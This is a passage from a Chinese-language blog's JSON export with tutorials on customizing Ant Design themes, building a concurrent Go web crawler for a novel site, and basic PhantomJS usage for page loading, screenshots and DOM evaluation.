$&#123;d.getMilliseconds()&#125;]`.green;&#125;/** * 监控 app.scss 文件，随便编译它 * src/style 任意一个 .scss 变化都会触发 css 编译 */(function watchSass() &#123; console.log(`$&#123;time()&#125; watch-scss.`); let state = false; const inputpath = './src/style/app.scss'; const outputpath = './src/style/app.css'; ck.watch('./src/style', &#123; ignored: /(([\\/\\\\])\\..)|\\.(css|less|js|svg)$/, &#125;).on('change', async (_path, event) =&gt; &#123; if (!(/\\.scss$/.test(_path) &amp;&amp; !state)) return; state = true; await new Promise(rs =&gt; setTimeout(rs, 120)); const temp = fs.readFileSync(outputpath, 'utf8').toString(); // scss =&gt; css sass.render(&#123; file: inputpath, precision: true, data: fs.readFileSync(inputpath, 'utf8').toString(), outputStyle: 'compressed', outFile: outputpath, sourceMap: false, precision: true, &#125;, (err, result) =&gt; &#123; if (err) &#123; console.error(`$&#123;time()&#125; watch-scss error:\\n`, err.message.red); return state = false; &#125; // 内容没变 if (temp.trim() === result.css.toString().trim()) &#123; return state = false; &#125; fs.writeFileSync(outputpath, result.css.toString().trim()); console.log(`$&#123;time()&#125; watch-scss build: $ $&#123;_path&#125; =&gt; $&#123;outputpath&#125;`); state = false; &#125;); &#125;);&#125;)(); 它的作用就是通过监听 .scss 文件的变化，来对 app.scss 文件进行监控编译。 简单使用引入组件使用： 123import &#123; Button &#125; from 'antd';// ...&lt;Button type=\"primary\"&gt;This is a button&lt;/Button&gt; 如果在页面上看到蓝色按钮，表示部署成功。 Ant Design MobileAntd-mobile 与 Ant Design 不同，它支持更多的平台，有以下特性和优势： UI 样式高度可配置，拓展性更强，轻松适应各类产品风格 基于 React Native 的 iOS / Android / Web 多平台支持，组件丰富、能全面覆盖各类场景 提供 组件按需加载 / Web 页面高清显示 / SVG Icon 等优化方案，一体式开发 使用 TypeScript 开发，提供类型定义文件，支持类型及属性智能提示，方便业务开发 全面兼容 react / preact； 环境配置这里介绍是使用 create-react-app 创建的项目。环境配置与上面相同，唯一不同的是库名的引入： 123import &#123; Button &#125; from 'antd-mobile'; // &lt;-- 这里// ...&lt;Button type=\"primary\"&gt;This is a button&lt;/Button&gt; 如果在，页面上看到按钮，表示部署成功。 React Native 上使用 Antd-mobileAntd-mobile 不但支持 Web，同时还支持 React-Native（真是福利）。 环境配置在使用 react-native init antd-demo 之后，进行环境的配置。 12npm install --save antd-mobilenpm install --save-dev babel-plugin-import 修改 .babelrc config 文件： 1234567&#123; \"presets\": [\"react-native\"], \"plugins\": [[\"import\", &#123; \"libraryName\": \"antd-mobile\" &#125;]], \"env\": &#123; // ... &#125;&#125; 注意：修改后需要重新编译一次：react-native run-android，如果还是失败了，可能需要清理缓存：cd android &amp;&amp; gradlew clean。 引入组件使用： 123import &#123; Button &#125; from 'antd-mobile';// ...&lt;Button type=\"primary\"&gt;This is a button&lt;/Button&gt; 如果在，页面上看到按钮，表示部署成功。 自定义主题Antd 默认是蓝色主题，如果不喜欢可以自己定制。Antd 使用的预处理语言是 Less。 Antd 提供了这些变量的定制 默认样式变量，并且采用 modifyVars 的方式来覆盖变量。 或者在目录下寻找：12\\node_modules\\antd-mobile\\lib\\style\\themes\\default.less\\node_modules\\antd\\lib\\style\\themes\\default.less 定制方式这里介绍是使用 create-react-app 创建的项目。 安装： 12# less 安装 v3 会报错（坑粑粑的）npm install --save-dev react-app-rewire-less less@2 less-loader 更改 config-overrides.js 文件： 123456789101112const &#123; injectBabelPlugin &#125; = require('react-app-rewired');const rewireLess = require('react-app-rewire-less');module.exports = function override(config, env) &#123; config = injectBabelPlugin(['import', &#123; libraryName: 'antd', style: true &#125;], config); config = rewireLess.withLoaderOptions(&#123; // 覆盖的变量 modifyVars: &#123; \"@primary-color\": \"#1DA57A\" &#125;, &#125;)(config, env); return config;&#125;; 为了更好的管理，把覆盖的变量统一放在一个文件。在项目目录创建一个 theme.js 文件： 12345module.exports = () =&gt; (&#123; '@primary-color': '#FF9900', '@link-color': '#1DA57A', '@border-radius-base': '2px',&#125;); config-overrides.js 更改为： 12345678910111213const &#123; injectBabelPlugin &#125; = require('react-app-rewired');const rewireLess = require('react-app-rewire-less');const theme = require('./theme');module.exports = function override(config, env) &#123; config = injectBabelPlugin(['import', &#123; libraryName: 'antd', style: true &#125;], config); config = rewireLess.withLoaderOptions(&#123; // 覆盖的变量 modifyVars: theme(), &#125;)(config, env); return config;&#125;; 如果看到橙色按钮说明成功了。 备注：此时配置成功时可以直接引入 less 来使用。 修改 webpack 配置如果上面的方法不行，试一下这种方法。先把 npm scripts 改为最初状态，接着把 webpack 配置文件吐出来，并安装模块： 1234npm run ejectnpm install --save-dev babel-preset-stage-0npm install --save-dev babel-plugin-importnpm install --save-dev less less-loader 接着，在项目根目录下创建 .babelrc文件，并且把 package.json 里的 babel 项去掉： 12345678910&#123; \"presets\": [ \"react-app\" ], \"plugins\": [ \"transform-runtime\", // https://github.com/ant-design/babel-plugin-import [ \"import\", &#123; \"libraryName\": \"antd\", \"style\": true &#125; ] ]&#125; 接着在下面两个的文件里添加： webpack.config.dev.jswebpack.config.prod.js 1234567891011121314// ant design 主题颜色let theme = '';try &#123; theme = require('../src/theme.js')() &#125;catch (err) &#123;&#125;const mod = `?&#123;\"sourceMap\":true,\"modifyVars\":$&#123;JSON.stringify(theme)&#125;&#125;`;// webpack configrules: [ &#123; test: /\\.less$/, loader: \"style-loader!css-loader!less-loader?\" + mod &#125;, // ...] 在 theme.js 文件里： 123module.exports = () =&gt; (&#123; '@primary-color': '#FF9900',&#125;); 如果看到橙色按钮说明成功了。 如果你想写 less，可以使用 less-vars-to-js 把 less 转为 js object. 可以参考以下配置： 123456789101112131415161718192021222324/** * ant design 主题配置 */const fs = require('fs');const lessToJs = require('less-vars-to-js');let themeVariables = &#123;&#125;;try &#123; themeVariables = lessToJs( fs.readFileSync( path.join(__dirname, '../src/style/ant-theme.less'), 'utf8' ) );&#125;catch (err) &#123; &#125;// ...&#123; test: /\\.less$/, loader: `style-loader!css-loader!less-loader?&#123;\"sourceMap\":true,\"modifyVars\":$&#123;JSON.stringify(theme)&#125;&#125;`,&#125;, 全覆盖方式如果上面的方法都失败了只能这样了，使用全覆盖方式，这种方式会把所有 style 引入（大概有 500k 的 css 文件）。 12@import \"~antd/dist/antd.less\"; // 引入官方提供的 less 样式入口文件@import \"your-theme-file.less\"; // 用于覆盖上面定义的变量 新建一个 style.less 包含上面代码，在 index.js 引入。 暴力方法（最后的方法）上面全覆盖方式把所有 style 都引入，有点不科学了，实在不行可以参考下面的直接修改源码的方式，这种方式不会引入所有 style，可以享受 import() 的福利。 style 相关的 less 文件： 12\\node_modules\\antd-mobile\\lib\\style\\themes\\default.less\\node_modules\\antd\\lib\\style\\themes\\default.less config-overrides.js 文件修改成： 12345678const &#123; injectBabelPlugin &#125; = require('react-app-rewired');const rewireLess = require('react-app-rewire-less');module.exports = function override(config, env) &#123; config = injectBabelPlugin(['import', &#123; libraryName: 'antd', style: true &#125;], config); config = rewireLess.withLoaderOptions(&#123; &#125;)(config, env); return config;&#125;; 为了方便，使用 nodejs 编写一个自动化程序，在根目录下创建一个 extra-theme.js 文件，它的任务就是找到目标文件，在 default.less 文件里追加额外的变量，实现覆盖变量，自定义主题样式的功能。 123456789101112131415161718192021222324252627282930const fs = require('fs');const path = require('path');// 默认主题路径const antd_style_path = './node_modules/antd/lib/style/themes/default.less';// 自定义的主题颜色const theme = fs.readFileSync('./src/style/antd-theme.less').toString();const defaultTheme = fs.readFileSync(antd_style_path, 'utf8').toString();// 开始fs.writeFileSync( antd_style_path, append(defaultTheme, theme));// 设置主题function append(content, theme) &#123; // 首次添加，没有 /* &#123; */ /* &#125; */ [区域标志] if (!/\\/\\*\\s\\&#123;\\s\\*\\//i.test(content) &amp;&amp; !/\\/\\*\\s\\&#125;\\s\\*\\//i.test(content)) &#123; content += `\\n/* &#123; */\\n$&#123;theme&#125;\\n/* &#125; */\\n`; return content; &#125; else &#123; const temp = `/* &#123; */\\n$&#123;theme&#125;\\n/* &#125; */\\n`; const start = content.match(/\\/\\*\\s\\&#123;\\s\\*\\/\\n?/); const end = content.match(/\\/\\*\\s\\&#125;\\s\\*\\/\\n?/); return content.slice(0, start.index) + temp + content.slice(end.index + end[0].length); &#125;&#125; 其次在根目录下的 src/style 新建一个 antd-theme.less 文件： 123456// 自定义的主题颜色@primary-color: #FF9900;@link-color: #1DA57A;@border-radius-base: 2px;@color-bule: bule;@color-red: red; 执行之后，就可以在 default.less 里看到新添加了的内容。 1234567/* &#123; */@primary-color: #FF9900;@link-color: #1DA57A;@border-radius-base: 2px;@color-bule: bule;@color-red: red;/* &#125; */ 接着在 npm scripts 里添加 钩子，它会在对应命令执行之前执行。 12\"prestart\": \"node extra-theme.js\",\"prebuild\": \"node extra-theme.js\", 精选组件antd 是 Ant Design 设计规范的 React 实现，所以我们倾向于只提供符合该规范、且带有视觉展现的 UI 组件，也尽量不重复造轮子。推荐使用以下社区已有的优秀实现，与 antd 形成互补： 类型 推荐组件 路由 react-router 布局 react-blocks 拖拽 react-dnd，react-draggable 代码编辑器 react-codemirror2 富文本编辑器 react-quill，react-draft-wysiwyg，react-lz-editor（Ant Design 风格） 拾色器 rc-color-picker，react-color 响应式 react-responsive，react-media 复制到剪贴板 react-copy-to-clipboard 页面 meta 属性 react-helmet，react-document-title 图标 react-fa，react-icons 二维码 qrcode.react 可视化图表 g2-react，recharts，victory 顶部进度条 nprogress 应用国际化 react-intl 代码高亮 react-syntax-highlighter Markdown 渲染 react-markdown 无限滚动 react-virtualized 地图 react-google-maps，google-map-react，react-amap 一些问题 在 React Native 上尝试了一些组件，目前效果不理想。（待定） 在 antd 上自定义时，之前试过成功了，后来使用 create-react-app 初始化新的项目时，怎么试都不能改变主题，暂时还不能确定是什么原因（可能是版本的问题），所以才有了暴力方法。 在 antd-mobile 上自定义主题失败，同时在文档里也没有找到定制主题（可能真的不能定制） 参考资料 use-with-create-react-app-cn","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"Go 优雅编写高并发爬虫（浅）","slug":"Go/Go 优雅编写高并发爬虫（浅）","date":"2017-10-10T06:40:07.000Z","updated":"2021-06-15T06:10:52.817Z","comments":true,"path":"/stories/2017/10/Go/Go 优雅编写高并发爬虫（浅）/","link":"","permalink":"http://me.lizhooh.com/stories/2017/10/Go/Go 优雅编写高并发爬虫（浅）/","excerpt":"前言Go 语言是一种并发编程语言，在 Go 里有一个非常重要的关键字 go（goroutine），一般我们可以用它做一些异步，并发的任务。下面记录着如何使用 Go 来优雅的编写爬虫，其中有些内容使用 Nodejs 来类比。","text":"前言Go 语言是一种并发编程语言，在 Go 里有一个非常重要的关键字 go（goroutine），一般我们可以用它做一些异步，并发的任务。下面记录着如何使用 Go 来优雅的编写爬虫，其中有些内容使用 Nodejs 来类比。 整个爬虫，都围绕着一个小说网站：https://www.readnovel.com/ !! 注意，小说阅读网的 CSS 大改了一次，已经不适合笔者在编写此文章时的爬虫。 Query在 Nodejs 里我们可以使用Cheerio来解析 HTML。而在 Go 里，我们可以使用goquery来解析 HTML，它同样有类似JQuery的语法，而且解析速度非常快。 安装： 1go get github.com/PuerkitoBio/goquery 其基本使用与 JQuery 无异。 123456789// goquery.NewDocumentFromReader(strings.NewReader(s))doc, _ := goquery.NewDocument(\"http://metalsucks.net\")// 在 go 里，不能用带有 $ 作为变量名doc.Find(\".sidebar-reviews article .content-block\").Each( func(i int, s *goquery.Selection) &#123; band := s.Find(\"a\").Text() title := s.Find(\"i\").Text() &#125;) Go 里变量定义了不使用会报错，_是一个占位符。一般来说，Go 会以 obj.NewXXX 命名的函数名为构造函数。goquery.NewDocument 是一个多步骤函数，它包括了 http 请求和 doc 解析数据两部分。等价于 Nodejs 这两步： 12const html = await fetch(url).then(res =&gt; res.text());const $ = cheerio.load(html); 小说列表数据接下来，获取小说列表的数据。 在 Nodejs 里，我们可以轻易的使用 Object 来定义一个数据对象。 1234567891011const Book = &#123; id: '', // id name: '', // 书名 author: '', // 作者 tag: '', // 类型 status: '', // 状态 words: '', // 字数 summary: '', // 介绍 image: '', // 配图 url: '' , // 链接&#125; 而在 Go 里只能使用结构体来定义数据对象。下面定义了一个数据类型为 Book，用来存储每本书的基础数据。 123456789101112// 自定义数据类型type Book struct &#123; Id string // id Name string // 书名 Author string // 作者 Tag string // 类型 Status string // 状态 Words string // 字数 Summary string // 介绍 Image string // 配图 Url string // 链接&#125; 注意：属性名大写开头，JSON 序列化需要大写开头。 在 Go 里，小写开头的属性/方法都会视为私有属性/方法，大写开头表示是公有的属性/方法、 实际上 Go 把结构体当成了类来使用，但它没有构造函数，可以使用 new 来实例化一个对象，得到是一个指针。 123book1 := new(Book) // book1 是指针// orvar book2 Book // book2 不是指针 接着编写一个函数，主要负责解析 HTML，获取数据。 12345678910111213141516171819202122232425262728293031func pageListData(url string, bookList *[]Book) &#123; html, _ := goquery.NewDocument(url) // 出错了 if err != nil &#123; fmt.Println(\"error:\", url, err) c &lt;- 1 // 发消息：我执行完啦！ return &#125; html.Find(\"div.right-book-list li\").Each( func(i int, s *goquery.Selection) &#123; book := new(Book) // 实例化，book 是指针 book.Name = s.Find(\".book-info &gt; h3 &gt; a\").Text() book.Author = s.Find(\".book-info &gt; h4 &gt; a\").Text() book.Tag = s.Find(\".book-info &gt; .tag &gt; .org\").Text() book.Status = s.Find(\".book-info &gt; .tag &gt; .red\").Text() book.Words = s.Find(\".book-info &gt; .tag &gt; .blue\").Text() book.Summary = s.Find(\".book-info &gt; .intro\").Text() book.Image, _ = s.Find(\".book-img &gt; a &gt; img\").Attr(\"src\") book.Image = \"https:\" + book.Image book.Url, _ = s.Find(\".book-img &gt; a\").Attr(\"href\") book.Url = HOST + book.Url book.Id = regexp.MustCompile(`\\d+`).FindString(Book.Url) *bookList = append(*bookList, *book) &#125;) c &lt;- 1 // 发消息：我执行完啦！&#125; 在 pageListData 里，传递 url 与 bookList 。因为后面需要使用 goroutine，所以不同通过 return 来接收数据，只能通过引用传递来接收数据。 在Go里的指针与C++差不多，在参数列表里 * 代表着传递地址，也就是说参数 bookList 是一个数组的地址，想要获取它的值则是 *bookList。[]Book 代表着这是一个类型为 Book 的数组，*[]Book代表传递的是一个数组的地址。 c 是一个信号量，用于控制异步流程。HOST 就是域名，它们在全局定义着： 12const HOST string = \"https://www.readnovel.com\"var c chan int // 信号量 尝试一次在 main 函数里编写： 123456789101112131415func main() &#123; c = make(chan int, 10) // 缓冲 10 个 start := time.Now() bookList := make([]Book, 0) go pageListData(\"https://www.readnovel.com/all?\", &amp;bookList) &lt;-c // 等待异步完成 // 输出数据 for i := 0; i &lt; len(bookList); i++ &#123; book := bookList[i] fmt.Printf(\"%02d %s - %s\\n\", i + 1, book.Name, book.Words) &#125; fmt.Println(\"[完成]\", time.Since(start))&#125; 在上面，通过使用 &amp; 来获取数组的地址（引用传递），最后输出小说的书名与字数。 &lt;- 操作符用来接受和发送消息 ch &lt;- 48，发送 48 进入管道，&lt;-ch 从管道接收消息。 结果： 123456789101101 重生八零俏佳妻 - 175.73万02 首席的独宠新娘 - 429.11万03 农媳V5：军长别上瘾 - 168.97万04 新婚无爱，替罪前妻 - 235.18万05 国民男神爱上我 - 299.05万06 腹黑总裁要抱抱 - 322.17万07 重生之嫡女谋嫁 - 224.7万08 贵女种田忙 - 311.97万09 绝色狂医：魔神大人，轻点撩 - 260.02万10 豪门暖婚蜜爱 - 501.3万[完成] 284.0185ms 小说详细信息当获取完小说列表数据项时，就可以根据 url 继续获取小说的详细信息，实现原理类似，这里略过。 并发控制Go 里高并发，非 goroutine 莫属，每次使用 go 关键件时，都会创建一个协程来执行指定的函数。 先在func main里定义一些变量来辅佐流程控制： 1234567891011// func mainconst MAXNUM int = 200 // 最大并发const MAXPAGE int = 2957 // 最大页码const pageSize int = 30 // 每页的列表项个数var num int = 0 // 当前并发个数var page int = 1 // 当前页码位置c = make(chan int, 10000) // 1w 个缓冲量bookList := make([]Book, 0)timeAll := time.Now() // 计算总时间 上面，设定了并发数量最大为 200 \\\\(&quot;▔□▔)\\/（Go 说，一点压力也没有）。一共预计 30 * 2975 = 89250 本小说。 接着，使用一个死循环，结合 goroutine + channel 完美的实现异步流程控制。（在 Go 里没有 while，用 for { } 就可以表示死循环了） 123456789101112131415161718192021222324252627282930313233343536373839// func mainfor &#123; // 开始时间 start := time.Now() // Go 没有三元运算符 if MAXPAGE - page &gt; MAXNUM &#123; num = MAXNUM &#125; else &#123; num = MAXPAGE - page &#125; // 结束标志 if num &lt;= 0 &#123; break &#125; // 并发任务 for i := 1; i &lt;= num; i++ &#123; // 使用 strconv 把 int 转为 string url := \"https://www.readnovel.com/all?pageNum=\" + strconv.Itoa(i + page) + \"&amp;pageSize=\" + strconv.Itoa(pageSize) go pageListData(url, &amp;bookList) &#125; // 等待 for i := 0; i &lt; num; i++ &#123; &lt;-c &#125; // 输出信息 fmt.Println(\"[完成]\", page, \"-\", page + num, time.Since(start), \"并发数：\", num) page += num&#125;fmt.Println(\"[全部完成] 总共用时：\", time.Since(timeAll), \"，一共：\", len(bookList), \"本书\") goroutine 200并发量，满网速（20 M）的抓取，其中没有出现过错误。（果然”够浪”） 12345678910111213141516[完成] 1 - 201 3.5732044s 并发数： 200[完成] 201 - 401 2.2411282s 并发数： 200[完成] 401 - 601 2.2151267s 并发数： 200[完成] 601 - 801 2.3481343s 并发数： 200[完成] 801 - 1001 2.5131437s 并发数： 200[完成] 1001 - 1201 2.5111436s 并发数： 200[完成] 1201 - 1401 2.7531575s 并发数： 200[完成] 1401 - 1601 1.9311105s 并发数： 200[完成] 1601 - 1801 2.8741644s 并发数： 200[完成] 1801 - 2001 2.3231328s 并发数： 200[完成] 2001 - 2201 2.3701356s 并发数： 200[完成] 2201 - 2401 3.3451913s 并发数： 200[完成] 2401 - 2601 2.3931368s 并发数： 200[完成] 2601 - 2801 2.2741301s 并发数： 200[完成] 2801 - 2957 2.0871193s 并发数： 156[全部完成] 总共用时： 37.7601598s ，一共： 88093 本书 多核并行化默认情况下，Go 只会使用一个 CPU 内核来执行 goroutine。 可以使用runtime模块，开启多核运行来实现多核并行化。 12cpuNummber := runtime.NumCPU() // cpu 个数runtime.GOMAXPROCS(2) // 最多使用 2 个核 不过，200 并发量只占用了 CPU（20% - 30%），更多出现的情况是网速满了，导致 CPU 更多的是在等待网络 IO。所以，开启多核并行化并没有什么明显提升的效果，一般只有单个 CPU 出现瓶颈时才考虑使用多核并行化。 数据存储在 Go 里数据存储方面还是比较复杂的，特别是对 JSON 的支持不好。这里只是把数据存储为 json 文件。 需要对类型添加 tag，告诉json.Marshal，序列化映射的内容。 1234567891011121314151617// Go 的 json 的序列化有病，如果是小写名称，就不能序列化，如果想显示小写，就需要写 `tag`type Book struct &#123; Id string `json:\"id\"` Name string `json:\"name\"` Author string `json:\"author\"` Tag string `json:\"tag\"` Status string `json:\"status\"` Words string `json:\"words\"` Summary string `json:\"summary\"` Image string `json:\"image\"` Url string `json:\"url\"`&#125;// 用来存储数组type BList struct &#123; List []Book `json:\"list\"`&#125; 最后，通过文件读写，把数据写进 data.json 里： 12345678910111213141516// func main// var blist BList// blist.List = bookList[0:3] // 这里只取 0,1,2,3data, _ := json.Marshal(&amp;bookList[0:3]) // 序列化file, err := os.Create(\"./data.json\")file.WriteString(string(data))// or// err := ioutil.WriteFile(\"./data.json\", data, 0)if err != nil &#123; fmt.Println(err)&#125; 最后看到的 json 文件结构应该类似： 1234567891011[&#123; \"id\": \"6233251403829601\", \"name\": \"重生八零俏佳妻\", \"author\": \"江山一顾\", \"tag\": \"现代言情\", \"status\": \"连载中\", \"words\": \"175.73万\", \"summary\": \"前世，盛宁懵懂无知，是从小背负不堪名声的‘坏人’。（省略了）\", \"image\": \"https://qidian.qpic.cn/qdbimg/349573/c_6233251403829601/90\", \"url\": \"https://www.readnovel.com/book/6233251403829601\"&#125;] 读取 json 文件： 12bytes, _ := ioutil.ReadFile(\"./data.json\")json.Unmarshal(bytes, &amp;bookList) Nodejs 与 Go 通信有时候，只想把密集的计算任务交给 Go 去处理，而 Nodejs 处理负责发起任务，接收任务结果，处理后序事情。比如，爬虫部分由 Go 来完成，数据处理由 Nodejs 去完成。 这里就涉及了一个 Nodejs 与 Go 通信的问题。Nodejs 与 Go 通信的方式有很多中，大多数都是通过网络协议或者进程信道来传递。 child_process在 Nodejs 里，可以通过 child_process 模块创建子进程来运行 Go 编译后的程序，通过 stdout 来传递数据，这种方式不推荐，调试起来非常困难。 123456const exec = require('child_process').exec;exec(`./go-spider.exe --arg1 a --arg2 b`, (err, stdout, stderr) =&gt; &#123; err &amp;&amp; console.log('err', err); stdout &amp;&amp; console.log('stdout', stdout); stderr &amp;&amp; console.log('stderr', stderr);&#125;); HTTP Server另外的方式是在 Go 里创建一个 HTTP 服务，之后 Nodejs 向相关发起任务请求等待 Go 完成任务后响应数据，这种方式是比较好的。 除了 HTTP 外，还可以建立 TCP/Websocket。大概意思差不多，都是通过网络协议来通信。 1234567891011121314151617181920212223242526package mainimport ( \"fmt\" \"log\" \"net/http\")func index(res http.ResponseWriter, req *http.Request) &#123; fmt.Fprintf(res, \"Hello Wrold!\")&#125;func spider(res http.ResponseWriter, req *http.Request) &#123; // 爬虫任务&#125;func main() &#123; http.HandleFunc(\"/\", index) // 路由 http.HandleFunc(\"/spider\", spider) fmt.Println(\"Server run in 5000 \") err := http.ListenAndServe(\":5000\", nil) // 监听 if err != nil &#123; log.Fatal(\"ListenAndServe: \", err) &#125;&#125; 如果 Go 与 Nodejs 需要双向通信，那么使用 socket.io 也是不错的选择。 参考资料 https://github.com/PuerkitoBio/goquery","categories":[{"name":"爬虫","slug":"爬虫","permalink":"http://me.lizhooh.com/categories/爬虫/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Go","slug":"Go","permalink":"http://me.lizhooh.com/tags/Go/"},{"name":"爬虫","slug":"爬虫","permalink":"http://me.lizhooh.com/tags/爬虫/"}]},{"title":"Phantomjs 简明的使用教程","slug":"抓包&爬虫/Phantomjs 简明的使用教程","date":"2017-10-07T01:11:14.000Z","updated":"2021-06-15T06:10:52.917Z","comments":true,"path":"/stories/2017/10/抓包&爬虫/Phantomjs 简明的使用教程/","link":"","permalink":"http://me.lizhooh.com/stories/2017/10/抓包&爬虫/Phantomjs 简明的使用教程/","excerpt":"前言Phantomjs 是一个基于 Webkit 的 JavaScript API 。它使用 QtWebKit 作为它核心浏览器的功能，使用 Webkit 来编译解释执行 JavaScript 代码。任何你可以在基于 webkit 浏览器做的事情，它都能做到。它不仅是个隐形的浏览器，提供了诸如 CSS 选择器、支持 Web 标准、DOM 操作、JSON、HTML5、Canvas、SVG 等，同时也提供了处理文件 I/O 的操作，从而使你可以向操作系统读写文件等。Phantomjs 的用处可谓非常广泛，诸如网络监测、网页截屏、无需浏览器的 Web 测试、页面访问自动化，动态页面爬虫等。 下面简要的介绍 Phantomjs 的正确使用方式。","text":"前言Phantomjs 是一个基于 Webkit 的 JavaScript API 。它使用 QtWebKit 作为它核心浏览器的功能，使用 Webkit 来编译解释执行 JavaScript 代码。任何你可以在基于 webkit 浏览器做的事情，它都能做到。它不仅是个隐形的浏览器，提供了诸如 CSS 选择器、支持 Web 标准、DOM 操作、JSON、HTML5、Canvas、SVG 等，同时也提供了处理文件 I/O 的操作，从而使你可以向操作系统读写文件等。Phantomjs 的用处可谓非常广泛，诸如网络监测、网页截屏、无需浏览器的 Web 测试、页面访问自动化，动态页面爬虫等。 下面简要的介绍 Phantomjs 的正确使用方式。 安装 phantomjs目前，phantomjs 版本是 2.1，支持在在 windows、linux、mac 上安装。 在 windows 上安装： 下载 phantomjs-2.1.1-windows.zip（17.4 MB）并解压缩内容。 把 bin 目录添加到系统的路径里，比如笔者安装在 D 盘：D:\\phantomjs-2.1.1-windows\\bin 在 linux 上安装： 下载 phantomjs-2.1.1-linux-x86_64.tar.bz2（22.3 MB）并提取内容。 12&gt; cd /usr/local&gt; tar zxvf phantomjs-2.1.1-linux-x86_64.tar.bz2 创建一个软链接，以便于访问。 1&gt; ln -sf phantomjs-2.1.1-linux-x86_64/bin/phantomjs phantomjs 安装完成之后，可以使用 -v 来检测是否安装成功： 12$ phantomjs -v2.1.1 基本使用Phantomjs 是使用 C++ 编写的一个应用程序，它能运行 js 代码，它提供一个类似 Nodejs 的 api。 注意：在 Phantomjs 里仅支持 ES5 语法，不要写 ES6 语法，包括 let, const, 字符串模版，箭头函数，Promise 都不能使用。 Hello world学习任何的知识（技术类）的开始都是写一个 “Hello world”，本例也不例外。 创建一个 hello.js 文件，包括下面的代码： 12console.log('Hello, world!');phantom.exit(); // 不调用，程序会一直挂空着 现在来运行它： 1phantomjs hello.js 可以看到输出了 Hello world! 注意：是使用 phantomjs hello.js 而不是 node hello.js。 加载页面Phantomjs 是一个无头的浏览器，当然少不了它的加载页面功能。对于 SPA，Ajax 等创建的动态页面，静态爬虫就没折了，因为数据是动态渲染的，只有在 DOM 完成后再通过异步获取后进行渲染。这种情况下可以使用 Phantomjs 来加载页面，等待加载完成后，再进行抓取工作。可以通过创建网页对象来加载，分析和呈现网页。 下面的通过 Phantomjs webpage 模块来动态的加载页面，同时在加载完成后把页面保存为图片。 12345678910var page = require('webpage').create(); // 与页面相关的模块// 页面加载完成，就会触发回调，也可以使用 page.onLoadFinished 代替page.open('https://www.baidu.com', function (status) &#123; console.log(\"Status: \" + status); // status 表示页面是否加载成功，success/fail if (status === \"success\") &#123; page.render('./baidu.png'); // 截图功能 &#125; phantom.exit();&#125;); 运行之后，是不是可以看到百度首页的图片。(*^__^*) 嘻嘻 默认情况下，page.open 使用 http get 来访问页面，也可以指定 http 的信息，下面指定为 http post： 123456789101112131415161718var webPage = require('webpage');var page = webPage.create();var options = &#123; operation: \"POST\", encoding: \"utf8\", headers: &#123; \"Content-Type\": \"application/json\" &#125;, data: JSON.stringify(&#123; some: \"data\", another: [\"custom\", \"data\"] &#125;),&#125;;page.open('http://example.com', options, function (status) &#123; console.log('Status: ' + status); // Do other things here...&#125;); DOM 操作要想对加载完成后的页面进行 DOM 操作也是非常简单，这需要一个“注入器”来执行 DOM 操作代码。使用 evaluate() 来注入 DOM 操作代码，在 evaluate 里维护着一个类似沙盘的空间，在里面可以使用浏览器的 API，但无法访问外部的 API。 在下面的代码里，使用 evaluate 来操作 DOM，在 evaluate 的参数里可以对其进行传入变量，以方便选择，但只能传递能被 JSON 序列化的数据，也就是不能传递 function 等。 1234567891011121314151617181920// 获取打开页面的 titlevar page = require('webpage').create();page.open(url, function(status) &#123; var data = &#123; id: 'app', &#125;; var app = page.evaluate(function(data) &#123; return document.getElementById(data.id).innerHTML; &#125;, data); var html = page.evaluate(function() &#123; return document.body.innerHTML; &#125;); console.log('id = ' + data.id + ': ' + app); console.log('html: ' + html); phantom.exit();&#125;); 由于在 evaluate 里是浏览器环境，所有使用 console 是不会在当前控制台输出内容的，可以使用 onConsoleMessage 来监听浏览器的 console 输出内容。 123page.onConsoleMessage = function(msg, lineNum, sourceId) &#123; console.log('console: ' + msg + ' (from line #' + lineNum + ' in \"' + sourceId + '\")');&#125;; 页面截图render() 可以将打开的网页截图并保存成本地图片，可以将指定的图片文件名作为参数传入。目前支持 PNG、GIF、JPEG、PDF 四种图片格式。 12// format 指定格式，quality 指定图片质量（1 - 100）page.render('google_home.jpeg', &#123; format: 'jpeg', quality: '100' &#125;); 在截图时有个默认的浏览器大小（800 * 600），不过可以使用 api 来设置浏览器大小与截图大小。 1234567var page = require('webpage').create();page.viewportSize = &#123; width: 414, height: 736 &#125;; // 模拟 iPhone6 plus 屏幕大小page.clipRect = &#123; top: 0, left: 0, width: 414, height: 736 &#125;; // 剪辑矩形page.open('https://m.baidu.com/', function() &#123; page.render('./baidu.png'); phantom.exit();&#125;); 截图效果： 加载外部脚本可以使用 includeJs() 来加载外部脚本，比如当前页面没有使用 JQuery，你可以给它加载一个 JQuery 来方便自己 DOM 操作。 12345678910page.open('http://www.example.com', function(status) &#123; page.includeJs('https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js', function() &#123; var title = page.evaluate(function() &#123; return $('head &gt; title').text(); &#125;); console.log('page title is', title); phantom.exit(); &#125;);&#125;); 此外还可以使用 injectJs(path) 来注入脚本文件： 123456page.injectJs('./do.js');// do.jswindow.returnTitle = function() &#123; return document.title;&#125;; 日志信息由于在沙箱中执行，所以 console.log 不会输出的终端，如果需要输出到终端，就要设置回调函数。 123page.onConsoleMessage = function(msg) &#123; console.log('console: ' + msg);&#125;; page 属性page 有几个常用的属性： page.content 页面内容。 page.plainText 没有 html 标签的页面内容。 page.cookie 页面的 cookie。 page.scrollPosition 可以指定滚动条位置，对于一些需要滚动条位置才加载数据的页面非常有用。 page.title 页面标题。 page.url 页面 url。 page.viewportSize 页面视图大小。 page.zoomFactor 截图缩放因子。 更多的具体参考：http://phantomjs.org/api/webpage/ 文件操作Phantomjs 提供了 fs 模块来进行文件操作，看起来使并不类似 Nodejs fs。 12345678910var fs = require('fs');fs.absolute(\".\"); // 当前位置fs.copy(\"A.txt\", \"folder/A.txt\"); // 复制文件fs.exists(path); // 判断文件是否存在var content = fs.read('file.txt'); // 读文件fs.write('output.txt', 'hello world', 'w'); // 写文件fs.size('output.txt'); // 文件大小 更多的具体参考：http://phantomjs.org/api/fs/ 注意：在 Phantomjs 里文件操作是同步的，不像 Nodejs 可以异步操作。 Web 